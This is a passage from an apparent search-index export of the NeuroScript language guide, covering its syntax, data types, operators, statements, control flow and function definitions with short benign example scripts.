directly into the source code. Lines beginning with <code>::</code> are treated as metadata, allowing you to document the file's purpose, version, author, or any other relevant information directly within the script itself.</p> <p>This metadata can be used by the interpreter or other tools for documentation, version control, or conditional execution.</p> <pre><code>:: title: My First Script\n:: version: 1.0\n:: author: A. Developer\n\nfunc main() means\n  :: description: This is the main entry point.\n  emit \"Hello from a well-documented script!\"\nendfunc\n</code></pre>"},{"location":"ns_full_guide/#13-your-first-neuroscript-file-a-hello-world-example","title":"1.3. Your First NeuroScript File: A \"Hello, World\" Example","text":"<p>The best way to understand NeuroScript is to see it in action. Here is a complete, simple \"Hello, World\" script.</p> <p>This example uses the command script model for direct execution.</p> <pre><code>:: title: Hello World Example\n:: version: 1.0\n:: purpose: A minimal script to demonstrate basic syntax.\n\ncommand\n  # The 'set' keyword assigns a value to a variable.\n  set message = \"Hello, NeuroScript!\"\n\n  # The 'emit' keyword outputs a value, typically to the console\n  # or as an event within the host system.\n  emit message\nendcommand\n</code></pre> <p>When executed, this script will: 1.  Define a variable named <code>message</code> and assign it the string <code>\"Hello, NeuroScript!\"</code>. 2.  <code>emit</code> the content of the <code>message</code> variable.</p>"},{"location":"ns_full_guide/#2-lexical-structure-core-syntax_1","title":"2. Lexical Structure &amp; Core Syntax","text":"<p>The lexical structure of a language defines its most basic rules: how comments are written, how words and symbols are interpreted, and what constitutes the fundamental building blocks of the code.</p>"},{"location":"ns_full_guide/#21-comments","title":"2.1. Comments","text":"<p>Comments are used to leave explanatory notes in the code that are ignored by the interpreter. NeuroScript supports three styles of single-line comments. There are no multi-line comment blocks.</p> <pre><code># A hash symbol starts a comment.\n-- Two dashes also start a comment.\n// Two slashes are also valid.\n\nset x = 1 # A comment can also appear after a statement.\n</code></pre>"},{"location":"ns_full_guide/#22-whitespace-newlines-and-line-continuations","title":"2.2. Whitespace, Newlines, and Line Continuations","text":"<p>Whitespace (spaces and tabs) is used to separate elements in the code to improve readability. It is generally ignored by the interpreter except where it is needed to distinguish one keyword or identifier from another.</p> <p>Newlines are significant. They are used to terminate statements. Every simple statement and most block headers must be followed by a newline.</p> <p>Line Continuations allow you to break a long statement across multiple physical lines for readability. A backslash (<code>\\</code>) at the very end of a line tells the interpreter to treat the next line as part of the current one.</p> <pre><code># A long statement can be broken up using a backslash.\nset a_very_long_variable_name = \"part 1\" + \\\n                              \"part 2\" + \\\n                              \"part 3\"\n</code></pre>"},{"location":"ns_full_guide/#23-identifiers","title":"2.3. Identifiers","text":"<p>An identifier is the name given to a variable or a function (<code>func</code>).</p> <ul> <li>Identifiers must start with a letter (<code>a-z</code>, <code>A-Z</code>) or an underscore (<code>_</code>).</li> <li>After the first character, they can contain letters, numbers (<code>0-9</code>), or underscores.</li> <li>Identifiers are case-sensitive. <code>myVar</code> is a different identifier from <code>myvar</code>.</li> </ul> <pre><code># Valid Identifiers\nset my_variable = 1\nset _internal_var = 2\nset FunctionName = 3\n\n# Invalid Identifier (starts with a number)\n# set 1_bad_name = 4\n</code></pre>"},{"location":"ns_full_guide/#24-keywords","title":"2.4. Keywords","text":"<p>Keywords are reserved words that have special meaning in NeuroScript and cannot be used as identifiers. All keywords are lowercase.</p> <p>The full list of keywords includes: <code>acos</code>, <code>and</code>, <code>as</code>, <code>asin</code>, <code>ask</code>, <code>atan</code>, <code>break</code>, <code>call</code>, <code>clear</code>, <code>clear_error</code>, <code>command</code>, <code>continue</code>, <code>cos</code>, <code>do</code>, <code>each</code>, <code>else</code>, <code>emit</code>, <code>endcommand</code>, <code>endfor</code>, <code>endfunc</code>, <code>endif</code>, <code>endon</code>, <code>endwhile</code>, <code>error</code>, <code>eval</code>, <code>event</code>, <code>fail</code>, <code>false</code>, <code>for</code>, <code>func</code>, <code>fuzzy</code>, <code>if</code>, <code>in</code>, <code>into</code>, <code>last</code>, <code>len</code>, <code>ln</code>, <code>log</code>, <code>means</code>, <code>must</code>, <code>mustbe</code>, <code>named</code>, <code>needs</code>, <code>nil</code>, <code>no</code>, <code>not</code>, <code>on</code>, <code>optional</code>, <code>or</code>, <code>return</code>, <code>returns</code>, <code>set</code>, <code>sin</code>, <code>some</code>, <code>tan</code>, <code>timedate</code>, <code>tool</code>, <code>true</code>, <code>typeof</code>, <code>while</code>.</p>"},{"location":"ns_full_guide/#25-file-header-and-metadata","title":"2.5. File Header and Metadata","text":"<p>A NeuroScript file can begin with a header section that contains file-level metadata and blank lines. This header is processed before the main script logic.</p> <p>Metadata lines start with <code>::</code> and provide key-value information about the script. The key is separated from the value by the first colon (<code>:</code>).</p> <pre><code>:: title: Script with a Header\n:: version: 1.0\n:: author: AI Agent 42\n\n# The header ends at the first line of code.\nfunc doSomething() means\n  :: description: This metadata belongs to the function, not the file.\n  emit \"Script started\"\nendfunc\n</code></pre> <p>The <code>file_header</code> can contain any number of metadata lines or newlines before the first <code>command</code> or <code>func</code> block begins.</p>"},{"location":"ns_full_guide/#3-data-types-and-literals_1","title":"3. Data Types and Literals","text":"<p>A literal is a value that is written directly into the source code, like the number <code>123</code> or the string <code>\"hello\"</code>. NeuroScript has a rich set of built-in data types, and their literal forms are the foundation of working with data in the language.</p>"},{"location":"ns_full_guide/#31-overview-of-neuroscripts-dynamic-types","title":"3.1. Overview of NeuroScript's Dynamic Types","text":"<p>NeuroScript is a dynamically-typed language. This means you do not need to declare the type of a variable before you use it. The type is determined at runtime based on the value assigned to it.</p> <pre><code># 'my_var' is a number here...\nset my_var = 10\n\n# ...and now it's a string. This is perfectly valid.\nset my_var = \"ten\"\n</code></pre> <p>The built-in types can be categorized into three groups: Primitive, Composite, and Special-Purpose.</p>"},{"location":"ns_full_guide/#32-primitive-types","title":"3.2. Primitive Types","text":"<p>Primitive types are the simplest, most fundamental data types.</p>"},{"location":"ns_full_guide/#321-string","title":"3.2.1. String","text":"<p>A sequence of characters to represent text. NeuroScript supports single-quoted (<code>'...'</code>), double-quoted (<code>\"...\"</code>), and triple-backtick (<code>`...`</code>) raw string literals.</p>"},{"location":"ns_full_guide/#322-number","title":"3.2.2. Number","text":"<p>Represents both integers (<code>100</code>) and floating-point (<code>3.14</code>) numbers. The language does not have a <code>complex</code> type.</p>"},{"location":"ns_full_guide/#323-boolean","title":"3.2.3. Boolean","text":"<p>A truth value, which can only be <code>true</code> or <code>false</code>.</p>"},{"location":"ns_full_guide/#324-bytes","title":"3.2.4. Bytes","text":"<p>Represents a sequence of raw bytes. There is no literal for bytes; they are typically created by tools (e.g., reading a file). This is useful for file I/O and networking contexts.</p>"},{"location":"ns_full_guide/#325-nil","title":"3.2.5. Nil","text":"<p>The <code>nil</code> type represents the intentional absence of any value.</p>"},{"location":"ns_full_guide/#33-composite-types","title":"3.3. Composite Types","text":"<p>Composite types are complex types built up from simpler ones.</p>"},{"location":"ns_full_guide/#331-list","title":"3.3.1. List","text":"<p>An ordered collection of values, enclosed in square brackets <code>[]</code>. A list can contain any mix of data types.</p> <pre><code>set my_list = [1, \"hello\", true, nil]\n</code></pre> <p>Lists are mutable, meaning they can be changed in-place. Appending elements is handled by external tools (e.g., <code>tool.List.Append()</code>), not a built-in operator.</p> <p>Note on Passing Lists to Functions: Composite types like Lists and Maps behave as if they are passed by reference. Modifications made to a list inside a function will affect the original variable in the caller's scope.</p>"},{"location":"ns_full_guide/#332-map","title":"3.3.2. Map","text":"<p>A collection of key-value pairs, enclosed in curly braces <code>{}</code>. Keys must be string literals, and values can be any data type.</p> <pre><code>set my_map = {\"name\": \"Agent Smith\", \"id\": 101}\n</code></pre>"},{"location":"ns_full_guide/#using-maps-as-structs-or-objects","title":"Using Maps as Structs or Objects","text":"<p>NeuroScript does not have a formal <code>struct</code> or <code>class</code> construct. Instead, it uses Maps to create structured data. The dot notation for access (<code>my_map.key</code>) is syntactic sugar for bracket notation (<code>my_map[\"key\"]</code>), allowing maps to be used in a way that feels like accessing properties on an object. The <code>set</code> statement will even automatically create nested maps as needed (\"auto-vivification\").</p> <pre><code># This single line creates a nested structure of maps.\nset user.address.city = \"Zion\"\n\n# It is equivalent to:\n# set user = {\"address\": {\"city\": \"Zion\"}}\n</code></pre>"},{"location":"ns_full_guide/#34-special-purpose-types","title":"3.4. Special-Purpose Types","text":"<p>These types have specific roles within the NeuroScript ecosystem. They generally do not have a direct literal representation and are instead returned from functions, tools, or specific language constructs.</p>"},{"location":"ns_full_guide/#341-function","title":"3.4.1. Function","text":"<p>A reference to a <code>func</code> defined within a script. Functions are first-class citizens, meaning they can be assigned to variables and passed as arguments to other functions or tools. This enables higher-order programming patterns.</p>"},{"location":"ns_full_guide/#342-tool","title":"3.4.2. Tool","text":"<p>A reference to an external capability provided by the host environment.</p>"},{"location":"ns_full_guide/#343-error","title":"3.4.3. Error","text":"<p>A special type that holds information about a runtime error, such as an error code and message.</p>"},{"location":"ns_full_guide/#344-event","title":"3.4.4. Event","text":"<p>Represents an event that can be emitted (<code>emit</code>) or handled (<code>on event</code>).</p>"},{"location":"ns_full_guide/#345-timedate","title":"3.4.5. Timedate","text":"<p>Represents a specific point in time, often with nanosecond precision. The <code>timedate</code> keyword can be used to get the current time. Arithmetic and comparisons (e.g., before/after) are handled by tools.</p> <pre><code>set now = timedate\n</code></pre>"},{"location":"ns_full_guide/#346-fuzzy","title":"3.4.6. Fuzzy","text":"<p>A reserved type for fuzzy logic operations, which allow for degrees of truth rather than simple true/false values.</p>"},{"location":"ns_full_guide/#347-unknown","title":"3.4.7. Unknown","text":""},{"location":"ns_full_guide/#an-internal-type-representing-an-indeterminate-or-unrecognized-type-often-as-the-result-of-an-error","title":"An internal type representing an indeterminate or unrecognized type, often as the result of an error.","text":""},{"location":"ns_full_guide/#4-variables-state-and-expressions_1","title":"4. Variables, State, and Expressions","text":"<p>The core of any NeuroScript program involves managing state through variables and manipulating that data using expressions. This section covers how to assign values, how to access them, and the rules that govern the operations you can perform.</p>"},{"location":"ns_full_guide/#41-variable-scope-and-lifetime","title":"4.1. Variable Scope and Lifetime","text":"<p>NeuroScript's variable scope is simple and predictable, designed to be easily understood by both humans and AIs.</p> <ul> <li>Function-Level Scope: The scope of a variable is the entire <code>func</code> or <code>command</code> block in which it is first defined. There is no block-level scope; a variable defined inside an <code>if</code> or <code>while</code> block is accessible for the rest of the function.</li> <li>Function Call Isolation: When a function is called, it executes in a new, isolated memory space. It cannot directly access or modify the local variables of its caller. Data is passed explicitly through parameters and <code>return</code> statements.</li> <li>Sandboxed Event Handlers: <code>on event</code> handlers also execute in a sandboxed, isolated scope. They have read-only access to any global variables but cannot modify them, preventing unintended side effects on the main program state.</li> </ul> <pre><code>func scope_example() means\n  set x = 10 # x is visible throughout the function\n  if x &gt; 5\n    set y = 20 # y is also visible throughout the function\n  endif\n  emit y # This is valid and will emit 20\nendfunc\n</code></pre>"},{"location":"ns_full_guide/#42-l-values-the-targets-of-assignment","title":"4.2. L-Values: The Targets of Assignment","text":"<p>An l-value (short for \"left-hand-side value\") is anything that can appear on the left side of an assignment (<code>=</code>) statement. It represents a memory location where a value can be stored. In NeuroScript, an l-value can be a simple variable or a more complex path that accesses elements within lists or maps.</p> <p>The basic syntax for an l-value is an <code>IDENTIFIER</code>, which can be followed by any number of accessors:</p> <ul> <li>Dot Access (<code>.key</code>): Accesses a value in a map using a static key.</li> <li>Bracket Access (<code>[expression]</code>): Accesses an element in a list using a number or a value in a map using a string. The expression inside the brackets is fully evaluated to determine the key.</li> </ul> <pre><code># Simple L-Values (just identifiers)\nset my_variable = 1\n\n# Complex L-Values\nset my_map.user.name = \"Alice\"           # Dot access\nset my_list[0] = \"first_item\"           # Bracket access with number\nset key_name = \"user\"\nset my_map[key_name] = \"bob\"            # Bracket access with variable\nset data.users[1].email = \"a@b.com\"   # Mixed access\n</code></pre>"},{"location":"ns_full_guide/#43-assigning-state-with-the-set-statement","title":"4.3. Assigning State with the <code>set</code> Statement","text":"<p>The <code>set</code> statement is the fundamental way to create or modify variables in NeuroScript. It evaluates the expression on the right side of the <code>=</code> and assigns the result to the l-value on the left.</p> <pre><code># Assign a literal value\nset count = 0\n\n# Assign the result of an expression\nset total = count + 10 * 5\n\n# Assign the result of a function call\nset current_time = tool.time.now()\n\n# You can assign to multiple l-values from a list.\n# The number of variables must exactly match the number of items.\nset a, b, c = [1, 2, 3]\n# `a` is now 1, `b` is 2, `c` is 3\n</code></pre>"},{"location":"ns_full_guide/#44-placeholders-for-string-interpolation","title":"4.4. Placeholders for String Interpolation","text":"<p>Placeholders allow you to embed the value of an identifier directly inside a string literal. This is a convenient alternative to string concatenation. A placeholder is an identifier enclosed in double curly braces <code>{{...}}</code>.</p> <p>Placeholders are only evaluated within triple-backtick <code>```...```</code> strings.</p> <pre><code>set name = \"World\"\nset raw_string = ```Hello, {{name}}! The value of 2+2 is {{2+2}}.```\n\n# After interpolation, raw_string would be \"Hello, World! The value of 2+2 is 4.\"\nemit raw_string\n</code></pre>"},{"location":"ns_full_guide/#45-operator-precedence","title":"4.5. Operator Precedence","text":"<p>NeuroScript has a well-defined order of operations to ensure that complex expressions are evaluated predictably. Operators with higher precedence are evaluated before operators with lower precedence.</p> <p>The order from highest to lowest precedence is:</p> <ol> <li>Accessor (<code>[]</code>) and Function Call (<code>()</code>)</li> <li>Power (<code>**</code>)</li> <li>Unary (<code>-</code>, <code>not</code>, <code>no</code>, <code>some</code>, <code>~</code>, <code>typeof</code>)</li> <li>Multiplicative (<code>*</code>, <code>/</code>, <code>%</code>)</li> <li>Additive (<code>+</code>, <code>-</code>)</li> <li>Relational (<code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code>, <code>&lt;=</code>)</li> <li>Equality (<code>==</code>, <code>!=</code>)</li> <li>Bitwise AND (<code>&amp;</code>)</li> <li>Bitwise XOR (<code>^</code>)</li> <li>Bitwise OR (<code>|</code>)</li> <li>Logical AND (<code>and</code>)</li> <li>Logical OR (<code>or</code>)</li> </ol> <p>You can use parentheses <code>()</code> to override the default precedence and force an expression to be evaluated first.</p>"},{"location":"ns_full_guide/#46-detailed-operator-guide","title":"4.6. Detailed Operator Guide","text":""},{"location":"ns_full_guide/#461-arithmetic-operators","title":"4.6.1. Arithmetic Operators","text":"Operator Description Example <code>+</code> Addition <code>5 + 3</code> <code>-</code> Subtraction <code>5 - 3</code> <code>*</code> Multiplication <code>5 * 3</code> <code>/</code> Division <code>6 / 3</code> <code>%</code> Modulo/Remainder <code>5 % 3</code> <code>**</code> Power/Exponent <code>5 ** 3</code>"},{"location":"ns_full_guide/#462-comparison-operators","title":"4.6.2. Comparison Operators","text":"Operator Description Example <code>==</code> Equal to <code>a == b</code> <code>!=</code> Not equal to <code>a != b</code> <code>&gt;</code> Greater than <code>a &gt; b</code> <code>&lt;</code> Less than <code>a &lt; b</code> <code>&gt;=</code> Greater than or equal to <code>a &gt;= b</code> <code>&lt;=</code> Less than or equal to <code>a &lt;= b</code>"},{"location":"ns_full_guide/#463-logical-operators","title":"4.6.3. Logical Operators","text":"Operator Description Example <code>and</code> Returns <code>true</code> if both operands are true <code>a and b</code> <code>or</code> Returns <code>true</code> if at least one operand is true <code>a or b</code>"},{"location":"ns_full_guide/#464-bitwise-operators","title":"4.6.4. Bitwise Operators","text":"Operator Description <code>&amp;</code> Bitwise AND <code>|</code> Bitwise OR <code>^</code> Bitwise XOR <code>~</code> Bitwise NOT <p>The language does not currently support bit-shifting operators (<code>&lt;&lt;</code>, <code>&gt;&gt;</code>).</p>"},{"location":"ns_full_guide/#465-unary-operators","title":"4.6.5. Unary Operators","text":"Operator Description Example <code>-</code> Negates a number <code>-5</code> <code>not</code> Inverts a boolean value <code>not true</code> <code>no</code> Checks if a list is empty or <code>nil</code> <code>no my_list</code> <code>some</code> Checks if a list contains at least one element <code>some my_list</code> <code>typeof</code> Returns the data type of its operand as a string <code>typeof 123</code>"},{"location":"ns_full_guide/#466-fuzzy-operators","title":"4.6.6. Fuzzy Operators","text":"<p>NeuroScript supports fuzzy logic, which deals with reasoning that is approximate rather than precise. A <code>fuzzy</code> value represents a degree of truth, typically between 0.0 (completely false) and 1.0 (completely true).</p>"},{"location":"ns_full_guide/#creating-a-fuzzy-value","title":"Creating a Fuzzy Value","text":"<p>Currently, there is no literal syntax for creating a fuzzy value directly. This is a planned future addition. For now, fuzzy values can only be created as the result of specific tool calls that are designed to measure degrees of similarity, confidence, or other non-binary states.</p> <pre><code># A hypothetical tool that compares two strings and returns a\n# fuzzy value representing their similarity.\nset similarity_score = tool.text.get_similarity(\"apple\", \"apples\")\n\n# similarity_score is now a `fuzzy` type.\n</code></pre>"},{"location":"ns_full_guide/#using-fuzzy-values","title":"Using Fuzzy Values","text":"<p>Fuzzy operations are automatically triggered when one or both operands of a standard operator is a <code>fuzzy</code> type.</p> <ul> <li>Fuzzy Equality and Relational (<code>==</code>, <code>!=</code>, <code>&gt;</code>, etc.): When comparing a <code>fuzzy</code> value to another value, the result is a standard boolean (<code>true</code> or <code>false</code>) based on whether the fuzzy value is above or below a certain threshold (typically 0.5).</li> </ul>"},{"location":"ns_full_guide/#-fuzzy-logical-and-or-when-logical-operators-are-used-with-fuzzy-values-they-perform-fuzzy-logic-calculations-like-taking-the-minimum-value-for-and-and-the-maximum-for-or-and-return-a-new-fuzzy-value","title":"- Fuzzy Logical (<code>and</code>, <code>or</code>): When logical operators are used with <code>fuzzy</code> values, they perform fuzzy logic calculations (like taking the minimum value for <code>and</code> and the maximum for <code>or</code>) and return a new <code>fuzzy</code> value.","text":""},{"location":"ns_full_guide/#5-fundamental-statements_1","title":"5. Fundamental Statements","text":"<p>Fundamental statements are the explicit, keyword-driven commands that form the building blocks of any NeuroScript program. Unlike expressions, which are evaluated to produce a value, statements are executed to perform an action, such as assigning a variable, controlling program flow, or interacting with the host system. Every line of executable code in NeuroScript is a statement.</p>"},{"location":"ns_full_guide/#51-the-must-statement-asserting-truth","title":"5.1. The <code>must</code> Statement: Asserting Truth","text":"<p>The <code>must</code> statement is a powerful assertion tool. It evaluates an expression, and if the result is not <code>true</code>, it halts the program with an error. It is the primary mechanism for enforcing preconditions and validating state within a script.</p> <p>Syntax: <code>must &lt;expression&gt;</code></p> <pre><code>func process_data(needs data_map) means\n  # Ensure the input map has the required key before proceeding.\n  must data_map[\"status\"] == \"ready\"\n\n  # ... continue processing, confident that status is 'ready'\nendfunc\n</code></pre>"},{"location":"ns_full_guide/#52-the-call-statement-invoking-functions-and-tools","title":"5.2. The <code>call</code> Statement: Invoking Functions and Tools","text":"<p>The <code>call</code> statement is used to execute a function or a tool without assigning its return value to a variable. This is useful when you are interested in the side effects of the call, such as printing to the console or modifying a file.</p> <p>Syntax: <code>call &lt;callable_expression&gt;</code></p> <pre><code># Execute a tool that performs an action but returns nothing.\ncall tool.log.info(\"Processing has started.\")\n\n# Call a user-defined function for its side effects.\ncall cleanup_temporary_files()\n</code></pre>"},{"location":"ns_full_guide/#53-the-ask-statement-prompting-for-input","title":"5.3. The <code>ask</code> Statement: Prompting for Input","text":"<p>The <code>ask</code> statement is used to prompt for user input. It sends an expression (typically a question string) to the host environment and can optionally store the user's response in a variable.</p> <p>Syntax: <code>ask &lt;expression&gt; [into &lt;identifier&gt;]</code></p> <pre><code>command\n  # Ask a question and store the answer in the 'user_name' variable.\n  ask \"What is your name?\" into user_name\n\n  emit \"Hello, \" + user_name\nendcommand\n</code></pre>"},{"location":"ns_full_guide/#54-the-emit-statement-firing-events","title":"5.4. The <code>emit</code> Statement: Firing Events","text":"<p>The <code>emit</code> statement is the primary way for a script to output data or signal that something has happened. The host system determines how to handle an emitted value\u2014it could be printed to the console, logged to a file, or broadcast as an event to other parts of an application. For sending data to multiple specific outputs, it is recommended to use tools (e.g., <code>tool.log.info</code>, <code>tool.network.send</code>).</p> <p>Syntax: <code>emit &lt;expression&gt;</code></p> <pre><code>set user_name = \"Alex\"\n\n# Emit a simple string.\nemit \"User logged in.\"\n\n# Emit the contents of a variable.\nemit user_name\n\n# Emit a complex data structure.\nemit {\"user\": user_name, \"status\": \"active\"}\n</code></pre>"},{"location":"ns_full_guide/#55-the-fail-statement-halting-with-an-error","title":"5.5. The <code>fail</code> Statement: Halting with an Error","text":"<p>The <code>fail</code> statement immediately stops the execution of the script and raises an error. You can optionally provide an expression (like an error message) to give more context about the failure. This is often used in <code>else</code> blocks or when validation checks do not pass.</p> <p>Syntax: <code>fail [&lt;expression&gt;]</code></p> <pre><code>func get_user_data(needs user_id) means\n  set user = tool.db.find_user(user_id)\n  if user == nil\n    # Stop execution if the user could not be found.\n    fail \"User with ID \" + user_id + \" not found.\"\n  endif\n  return user\nendfunc\n</code></pre>"},{"location":"ns_full_guide/#56-state-clearing-statements","title":"5.6. State Clearing Statements","text":"<p>These statements are used to reset specific states within the interpreter.</p>"},{"location":"ns_full_guide/#561-clear_error","title":"5.6.1. <code>clear_error</code>","text":"<p>Used inside an <code>on error</code> block, <code>clear_error</code> resets the script's error state, allowing execution to continue normally after the error handler finishes. If the error is not cleared, the script will terminate after the handler completes.</p> <p>Syntax: <code>clear_error</code></p>"},{"location":"ns_full_guide/#562-clear-event","title":"5.6.2. <code>clear event</code>","text":"<p>The <code>clear event</code> statement removes event handlers that were previously registered with <code>on event</code>. You can clear a handler by its event name expression or by a specific handler name.</p> <p>Syntax: <code>clear event &lt;expression&gt;</code> or <code>clear event named &lt;string_literal&gt;</code></p> <pre><code># Remove the handler for a specific event\nclear event \"user.login\"\n\n# Remove a handler that was given a specific name\nclear event named \"MyLoginHandler\"\n</code></pre>"},{"location":"ns_full_guide/#6-control-flow-structures_1","title":"6. Control Flow Structures","text":"<p>Control flow structures allow you to direct the execution of your script, enabling it to make decisions, repeat actions, and handle different situations in a structured way. In NeuroScript, all control flow is managed with explicit blocks that have clear start and end keywords.</p>"},{"location":"ns_full_guide/#61-conditional-logic-ifelseendif","title":"6.1. Conditional Logic: <code>if</code>/<code>else</code>/<code>endif</code>","text":"<p>The <code>if</code> statement is the primary tool for making decisions. It executes a block of code only if a specified condition is <code>true</code>.</p> <p>Syntax: <pre><code>if &lt;expression&gt;\n  ... body ...\nelse\n  ... optional else body ...\nendif\n</code></pre></p> <ul> <li>The expression after <code>if</code> is evaluated.</li> <li>If it is <code>true</code>, the statements in the main body are executed.</li> <li>If it is <code>false</code>, the statements in the optional <code>else</code> block are executed.</li> <li>Every <code>if</code> statement must be closed with <code>endif</code>.</li> <li>Else-if chains are created by nesting a new <code>if</code> statement directly inside an <code>else</code> block.</li> </ul> <p>Examples:</p> <pre><code># Simple if statement\nfunc check_value(needs x) means\n  if x &gt; 100\n    emit \"The value is large.\"\n  endif\nendfunc\n\n# If-else statement\nfunc check_sign(needs x) means\n  if x &gt;= 0\n    emit \"The number is non-negative.\"\n  else\n    emit \"The number is negative.\"\n  endif\nendfunc\n\n# Nested if to create an \"else-if\" chain\nfunc check_grade(needs score) means\n  if score &gt;= 90\n    emit \"Grade: A\"\n  else\n    if score &gt;= 80\n      emit \"Grade: B\"\n    else\n      emit \"Grade: C or lower\"\n    endif\n  endif\nendfunc\n</code></pre>"},{"location":"ns_full_guide/#62-looping","title":"6.2. Looping","text":"<p>Loops are used to execute a block of code multiple times. NeuroScript provides two types of loops.</p>"},{"location":"ns_full_guide/#621-while-endwhile-loops","title":"6.2.1. <code>while</code> / <code>endwhile</code> Loops","text":"<p>A <code>while</code> loop repeats a block of statements as long as its condition remains <code>true</code>. The condition is checked before each iteration.</p> <p>Syntax: <pre><code>while &lt;expression&gt;\n  ... loop body ...\nendwhile\n</code></pre></p> <pre><code># A loop that counts down from 5\nfunc countdown() means\n  set counter = 5\n  while counter &gt; 0\n    emit counter\n    set counter = counter - 1\n  endwhile\n  emit \"Liftoff!\"\nendfunc\n</code></pre>"},{"location":"ns_full_guide/#622-for-each-in-endfor-loops","title":"6.2.2. <code>for each</code> / <code>in</code> / <code>endfor</code> Loops","text":"<p>A <code>for each</code> loop iterates over the elements of a list or other iterable collection. For each element in the collection, it executes the loop body, assigning the current element's value to a temporary variable.</p> <p>Syntax: <pre><code>for each &lt;identifier&gt; in &lt;expression&gt;\n  ... loop body ...\nendfor\n</code></pre></p> <pre><code># A loop that processes each item in a list\nfunc process_items(needs item_list) means\n  for each item in item_list\n    call tool.process(item)\n    emit \"Processed: \" + item\n  endfor\nendfunc\n</code></pre>"},{"location":"ns_full_guide/#63-modifying-loop-behavior-break-and-continue","title":"6.3. Modifying Loop Behavior: <code>break</code> and <code>continue</code>","text":"<p>You can alter the flow of a <code>while</code> or <code>for each</code> loop using the <code>break</code> and <code>continue</code> statements.</p> <ul> <li><code>break</code>: Immediately terminates the innermost loop it is in. Execution resumes at the first statement after the <code>endwhile</code> or <code>endfor</code>.</li> <li><code>continue</code>: Immediately stops the current iteration of the innermost loop and proceeds to the next one. For a <code>while</code> loop, it re-evaluates the condition. For a <code>for each</code> loop, it moves to the next item in the collection.</li> </ul> <pre><code>func find_first_admin(needs user_list) means\n  set found_admin = nil\n  for each user in user_list\n    # Skip any users that are not maps\n    if typeof(user) != \"map\"\n      continue\n    endif\n\n    # If we find an admin, store it and exit the loop\n    if user[\"is_admin\"] == true\n      set found_admin = user\n      break\n    endif\n  endfor\n  return found_admin\nendfunc\n</code></pre>"},{"location":"ns_full_guide/#64-limitations","title":"6.4. Limitations","text":"<p>NeuroScript does not currently implement a <code>switch</code> statement for multi-way branching. Complex conditional logic should be handled with <code>if</code>/<code>else</code> chains.</p>"},{"location":"ns_full_guide/#7-scripting-models_1","title":"7. Scripting Models","text":"<p>NeuroScript files are structured in one of two distinct models, depending on their intended purpose. A single script file must exclusively use one model; they cannot be mixed. This design enforces a clear separation between scripts that execute a direct sequence of commands and those that define reusable libraries of logic.</p>"},{"location":"ns_full_guide/#71-command-scripts-the-top-level-execution-block","title":"7.1. Command Scripts: The Top-Level Execution Block","text":"<p>A Command Script is used for direct, immediate execution of a task. It consists of one or more <code>command</code> blocks that are executed sequentially by the interpreter. This model is ideal for single-purpose scripts, application entry points, or simple automation tasks.</p>"},{"location":"ns_full_guide/#structure-command-endcommand","title":"Structure: <code>command</code> / <code>endcommand</code>","text":"<p>The script's logic is placed inside a block that starts with the <code>command</code> keyword and ends with <code>endcommand</code>. All statements inside this block are executed from top to bottom.</p> <pre><code>:: title: A Simple Command Script\n\ncommand\n  :: description: This command will run immediately.\n\n  set user_name = \"guest\"\n  emit \"Command started for user: \" + user_name\n  call tool.perform_task(user_name)\n  emit \"Command finished.\"\nendcommand\n</code></pre>"},{"location":"ns_full_guide/#allowed-statements","title":"Allowed Statements","text":"<p>Command blocks can contain most simple statements (<code>set</code>, <code>call</code>, <code>emit</code>, <code>fail</code>, <code>ask</code>, <code>must</code>) and all control flow blocks (<code>if</code>, <code>while</code>, <code>for each</code>).</p> <p>Key differences from library functions are: - You cannot use the <code>return</code> statement. - You cannot define a <code>func</code> within a <code>command</code> block. - Error handling is done via <code>on error do</code> blocks.</p>"},{"location":"ns_full_guide/#72-library-scripts","title":"7.2. Library Scripts","text":"<p>A Library Script is not executed directly. Instead, it serves as a collection of reusable procedures and event handlers that are loaded into an environment. Another script or a host application can then call the functions or trigger the events defined in the library. This model is used to build up a repository of common logic.</p> <p>A library script consists of any number of <code>func</code> blocks and top-level <code>on event</code> blocks.</p>"},{"location":"ns_full_guide/#defining-procedures-with-func-endfunc","title":"Defining Procedures with <code>func</code> / <code>endfunc</code>","text":"<p>The most common part of a library is the procedure, defined with <code>func</code> and <code>endfunc</code>. These are named blocks of code that can accept parameters and return values, making them the primary unit of reusable logic.</p>"},{"location":"ns_full_guide/#handling-global-events-with-on-event","title":"Handling Global Events with <code>on event</code>","text":"<p>A library can also define handlers for global events. These <code>on event</code> blocks are not attached to a specific function but exist at the top level of the script. When the host system emits a matching event, the code inside the handler is executed.</p>"},{"location":"ns_full_guide/#title-user-utility-library-version-12-a-reusable-function-to-format-a-users-name-func-format_user_nameneeds-user_map-returns-formatted_name-means-set-formatted_name-user_maplast_name-user_mapfirst_name-return-formatted_name-endfunc-a-handler-that-listens-for-a-system-wide-user-login-event-on-event-userlogin-as-event_data-do-call-toolloginfouser-logged-in-event_datauser_id-endon","title":"<pre><code>:: title: User Utility Library\n:: version: 1.2\n\n# A reusable function to format a user's name.\nfunc format_user_name(needs user_map returns formatted_name) means\n  set formatted_name = user_map[\"last_name\"] + \", \" + user_map[\"first_name\"]\n  return formatted_name\nendfunc\n\n# A handler that listens for a system-wide user login event.\non event \"user.login\" as event_data do\n  call tool.log.info(\"User logged in: \" + event_data[\"user_id\"])\nendon\n</code></pre>","text":""},{"location":"ns_full_guide/#8-procedures-tools-and-calls_1","title":"8. Procedures, Tools, and Calls","text":"<p>While fundamental statements and control flow direct the immediate execution of a script, the true power of NeuroScript comes from creating reusable logic with procedures (functions) and interacting with the outside world through tools. This section details how to define, call, and structure these powerful constructs.</p>"},{"location":"ns_full_guide/#81-defining-a-function-func","title":"8.1. Defining a Function (<code>func</code>)","text":"<p>A procedure, or function, is a named block of reusable code defined in a library script. Functions are the primary way to organize and modularize your logic. Every function is defined using the <code>func</code> keyword and must end with <code>endfunc</code>. The terms \"function\" and \"procedure\" are used interchangeably.</p> <p>Syntax: <pre><code>func &lt;identifier&gt;(&lt;signature&gt;) means\n  ... function body ...\nendfunc\n</code></pre></p>"},{"location":"ns_full_guide/#82-defining-a-signature","title":"8.2. Defining a Signature","text":"<p>A function's signature declares the parameters it accepts and the values it returns. The signature is defined within the parentheses <code>()</code> following the function's name. It consists of three optional clauses: <code>needs</code>, <code>optional</code>, and <code>returns</code>.</p>"},{"location":"ns_full_guide/#821-required-parameters-needs","title":"8.2.1. Required Parameters: <code>needs</code>","text":"<p>The <code>needs</code> clause lists the parameters that are required for the function to execute. The caller must provide a value for every parameter in this list.</p> <pre><code>func calculate_area(needs width, height) means\n  set area = width * height\n  return 